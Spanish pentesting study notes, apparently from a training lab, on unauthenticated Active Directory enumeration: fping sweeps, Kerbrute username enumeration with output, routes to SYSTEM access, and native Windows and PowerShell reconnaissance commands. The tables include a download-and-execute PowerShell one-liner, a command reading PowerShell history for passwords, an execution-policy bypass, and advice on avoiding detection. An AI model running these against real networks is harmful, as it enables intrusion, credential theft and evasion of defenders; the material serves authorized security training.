
Es habitual comenzar una auditoría **desde un host Linux sin credenciales de dominio**. Muchas organizaciones prefieren ver qué se puede lograr desde una posición ciega, lo que simula escenarios reales como:

- Un atacante que compromete la red desde Internet (phishing, RCE, VPN expuesta...).    
- Acceso físico (invitado malicioso, acceso a un puerto LAN).    
- Acceso Wi-Fi desde fuera del edificio.    
- Un empleado desleal o comprometido.    

🟡 **Según el resultado**, el cliente puede decidir facilitarte:
- Un **host unido al dominio**, o    
- Unas **credenciales limitadas** para acelerar y ampliar la auditoría.

| Punto clave                      | Descripción |
|----------------------------------|-------------|
| **Usuarios de AD (AD Users)**    | Enumerar cuentas válidas que puedan ser objetivo de ataques como password spraying o ASREPRoasting. |
| **Equipos unidos al dominio**    | Especialmente los críticos: Controladores de Dominio, servidores de ficheros, SQL, web, correo (Exchange), etc. |
| **Servicios clave**              | Detectar servicios como Kerberos (88/TCP), LDAP (389/TCP), NetBIOS (137/139), DNS (53), SMB (445), que indiquen entorno Windows-AD. |
| **Equipos y servicios vulnerables** | Buscar “quick wins” — hosts con vulnerabilidades explotables que te permitan obtener acceso inicial (SMB abierto, RCE conocida, credenciales por defecto, etc.). |

🛠️ **Importante**: guarda los resultados de las herramientas (`nmap`, `smbclient`, `crackmapexec`, etc.) y capturas clave. Todo lo que documentes aquí puede justificar el acceso posterior o elevar la criticidad del informe.

### 🎯 TTPs (Tácticas, Técnicas y Procedimientos) para enumerar Active Directory

Enumerar un entorno de Active Directory **sin un plan claro puede ser abrumador**. Hay **una enorme cantidad de datos** en AD y si lo haces todo de golpe, puedes perder información relevante o duplicar trabajo inútil.

🔸 Lo recomendable es **trabajar por etapas**, desarrollando tu propia **metodología repetible** a medida que ganes experiencia. Aunque cada pentester tiene su estilo, el flujo inicial suele seguir una misma lógica.

##### 🧭 Metodología general propuesta

1. **🎯 Establece un plan**    
    - Define claramente qué vas a buscar en cada fase.        
    - No te limites a una sola herramienta, prueba varias para ver diferencias, sintaxis y resultados.
        
2. **🔎 Detección pasiva de hosts**    
    - Escucha el entorno sin generar tráfico activo (por ejemplo: ARP, mDNS, LLMNR).        
    - Ideal en escenarios stealth o con restricciones.
        
3. **📡 Validación activa de hosts detectados**    
    - Escaneos activos (`nmap`, `smbclient`, `ldapsearch`, etc.).        
    - Identificar servicios, nombres de máquina, posibles vulnerabilidades.
        
4. **🔍 Recolección de información interesante**    
    - Consultas LDAP, detección de sesiones activas, shares abiertos, SPNs, GPOs, etc.        
    - Guardar todo lo que tenga potencial de explotación o acceso a datos internos.
        
5. **🧠 Revisión y planificación**    
    - Evalúa lo obtenido: ¿tenemos ya una cuenta de usuario o credenciales válidas?        
    - Si es así, comenzar con **enumeración autenticada** desde tu host atacante (Linux) o pivotar a una máquina unida al dominio.

En auditorías black-box, conviene **escuchar primero la red** con herramientas como **Wireshark** o **tcpdump**, antes de lanzar escaneos.
Aunque en redes conmutadas solo vemos el tráfico del dominio de broadcast, podemos identificar:
- IPs activas vía **ARP**    
- Nombres de host mediante **mDNS/LLMNR**    
- Tráfico que indica presencia de **Active Directory** (LDAP, Kerberos)   

Esto ayuda a entender la red sin generar ruido y planificar los siguientes pasos.

### Usando fping

`fping` es similar a `ping`, pero más eficiente para escaneos en red. Permite enviar peticiones ICMP a múltiples direcciones a la vez, lo que lo hace útil en auditorías internas.

- Acepta rangos o listas de IPs.    
- Funciona en modo round-robin, sin esperar respuesta completa de cada host antes de continuar.    
- Es scriptable y rápido.    

Aunque ICMP no muestra toda la actividad posible, permite tener una primera visión de los hosts activos. A partir de ahí, se puede combinar con escaneos más profundos por puertos y servicios. Aquí iniciaremos `fping` con algunos flags:

- `a` para mostrar los objetivos que están activos,    
- `s` para imprimir estadísticas al final del escaneo,    
- `g` para generar una lista de objetivos a partir de una red en formato CIDR,    
- y `q` para no mostrar resultados por cada objetivo.

```shell-session
amr251@htb[/htb]$ fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240
...SNIP...
```

El comando anterior valida qué hosts están activos en la red `/23` y lo hace de forma silenciosa, en lugar de saturar la terminal con resultados para cada IP de la lista objetivo. Podemos combinar los resultados exitosos con la información obtenida en las comprobaciones pasivas para crear una lista y realizar un escaneo más detallado con Nmap. A partir del comando `fping`, podemos ver 9 "hosts vivos", incluyendo nuestro host de ataque.

### Identificando usuarios

Si el cliente no nos proporciona una cuenta de usuario para comenzar las pruebas (lo cual es habitual), necesitaremos encontrar una forma de **obtener acceso al dominio** mediante alguno de estos métodos:

- Credenciales en texto claro    
- Un **hash NTLM** de un usuario    
- Una **shell SYSTEM** en un host unido al dominio    
- Una shell en el **contexto de un usuario de dominio**    

Conseguir un usuario válido con sus credenciales es un paso **crítico** en las fases iniciales de una auditoría interna. Incluso con acceso de bajo nivel, se abren muchas posibilidades para realizar **enumeración más avanzada** e incluso lanzar ataques posteriores.

Veamos una forma de empezar a construir una lista de usuarios válidos en un dominio, que podremos usar más adelante en la evaluación.

### Kerbrute - Enumeración de usuarios desde dentro en AD

Kerbrute es una opción más discreta para **enumerar cuentas de dominio**, ya que se basa en errores de preautenticación de Kerberos, los cuales **normalmente no generan logs ni alertas**.

Se utiliza junto a diccionarios como `jsmith.txt` o `jsmith2.txt` del repositorio de **Insidetrust**, que incluye múltiples listas de usuarios muy útiles para esta fase cuando partimos sin autenticación.

Apuntamos Kerbrute contra el **controlador de dominio (DC)** identificado previamente y le pasamos una wordlist. Es rápido y nos indica si los usuarios existen o no, lo cual sirve como punto de partida para ataques como **password spraying** (que veremos más adelante).

```shell-session
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

2021/11/17 23:01:46 >  Using KDC(s):
2021/11/17 23:01:46 >   172.16.5.5:88
2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL

 <SNIP>
 
2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds
```


### Cuenta LOCAL SYSTEM (`NT AUTHORITY\SYSTEM`) en entornos Windows

`NT AUTHORITY\SYSTEM` es una cuenta interna del sistema operativo Windows con el **máximo nivel de privilegios**. Es la cuenta que utilizan muchos servicios de Windows (y algunos de terceros) para ejecutarse por defecto.

En un host unido a un dominio, obtener acceso como SYSTEM permite **enumerar el Active Directory** actuando como la **cuenta del equipo**, que también es un objeto de usuario dentro del dominio.

Tener acceso SYSTEM en una máquina unida al dominio es, en la práctica, casi equivalente a tener una cuenta de usuario del dominio.

---

### Formas comunes de obtener acceso SYSTEM:

- Explotar vulnerabilidades remotas: **MS08-067**, **EternalBlue**, **BlueKeep**    
- Abusar de servicios que se ejecutan como SYSTEM o del privilegio `SeImpersonate` mediante herramientas como **Juicy Potato** (funciona en sistemas antiguos, pero no en versiones modernas como Server 2019)    
- Usar fallos de escalada de privilegios locales (por ejemplo, 0-day del programador de tareas en Windows 10)    
- Tener acceso administrador en una máquina del dominio y usar **PsExec** para lanzar una shell como SYSTEM    

---

### Qué puedes hacer con acceso SYSTEM en un host unido al dominio:

- Enumerar el dominio con herramientas como **BloodHound** o **PowerView**    
- Lanzar ataques de **Kerberoasting** o **ASREPRoasting**    
- Ejecutar **Inveigh** para capturar hashes Net-NTLMv2 o hacer SMB relay    
- Realizar **impersonación de tokens** para secuestrar sesiones de usuarios privilegiados    
- Ejecutar ataques sobre **permisos ACL** en objetos de AD

Ten en cuenta el **alcance y estilo de la auditoría** al elegir las herramientas a utilizar.
Si estás realizando una **auditoría no evasiva** (todo comunicado y visible, con el personal del cliente al tanto), no importa demasiado el nivel de ruido que generes en la red.
Sin embargo, en una **auditoría evasiva**, una **evaluación adversarial** o un **ejercicio Red Team**, el objetivo es simular los TTPs de un atacante real, y en ese contexto la **discreción es fundamental**.
Lanzar Nmap contra toda la red no es precisamente sigiloso, y muchas de las herramientas habituales de pentesting pueden generar alertas si el cliente tiene un SOC preparado o un equipo Blue con experiencia.
Por eso, **asegúrate siempre de aclarar los objetivos y el estilo de la prueba con el cliente por escrito antes de comenzar**.

## Escenario

A continuación vamos a ver un escenario para AD y como enumerar todo tipo de información desde un host Windows. Supongamos que nuestro cliente nos ha pedido que probemos su entorno AD desde un equipo gestionado sin acceso a Internet, y todos los intentos de cargar herramientas en él han fracasado. El cliente quiere ver qué tipos de enumeración son posibles, así que tendremos que recurrir a “vivir del terreno” usando solo herramientas y comandos nativos de Windows/Active Directory. Esto también puede ser un enfoque más sigiloso y puede no generar tantos registros ni alertas como cuando incorporamos herramientas externas en secciones anteriores. La mayoría de los entornos empresariales actuales cuentan con algún tipo de monitorización y registro de red, incluidos IDS/IPS, cortafuegos y sensores pasivos, además de defensas en los propios hosts como Windows Defender o EDR corporativo. Dependiendo del entorno, también pueden tener sistemas que establecen una línea base de tráfico “normal” y buscan anomalías. Por ello, nuestras posibilidades de ser detectados aumentan exponencialmente cuando empezamos a introducir herramientas en el entorno desde el exterior.

##### Comandos de entorno para el host y reconocimiento de red

| Comando                                           | Resultado                                                                                       |
|---------------------------------------------------|-------------------------------------------------------------------------------------------------|
| `hostname`                                        | Imprime el nombre del equipo                                                                    |
| `[System.Environment]::OSVersion.Version`         | Muestra la versión y nivel de revisión del sistema operativo                                    |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lista los parches y hotfixes instalados en el equipo                                             |
| `ipconfig /all`                                   | Muestra el estado y la configuración de los adaptadores de red                                   |
| `set`                                             | Muestra las variables de entorno de la sesión actual (ejecutado desde CMD)                      |
| `echo %USERDOMAIN%`                               | Muestra el nombre del dominio al que pertenece el equipo (ejecutado desde CMD)                  |
| `echo %logonserver%`                              | Imprime el nombre del controlador de dominio con el que el equipo inicia sesión (desde CMD)     |

El comando `systeminfo` imprime un resumen de la información del equipo en una sola salida concisa. Ejecutar un único comando genera menos registros, reduciendo así la probabilidad de ser detectados por un defensor.

##### Aprovechando PowerShell

| Cmdlet                                                                                     | Descripción                                                                                                                                                                |
| ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                               | Lista los módulos disponibles que están cargados para su uso.                                                                                                              |
| `Get-ExecutionPolicy -List`                                                                | Muestra las políticas de ejecución configuradas para cada ámbito (scope) en el equipo.                                                                                     |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                | Cambia la política de ejecución solo para el proceso actual, revirtiéndose al cerrar o terminar el proceso. Ideal para no dejar cambios permanentes en el equipo víctima.  |
| `Get-ChildItem Env: \| ft Key,Value`                                                       | Muestra variables de entorno, como rutas, usuarios, información del equipo, etc.                                                                                           |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Obtiene el historial de comandos de PowerShell del usuario especificado, lo cual puede revelar contraseñas o indicar archivos de configuración o scripts con credenciales. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <comandos>"`     | Descarga y ejecuta rápidamente un script desde una URL en memoria usando PowerShell, sin guardar el archivo en disco (`-nop` = NoProfile).                                 |

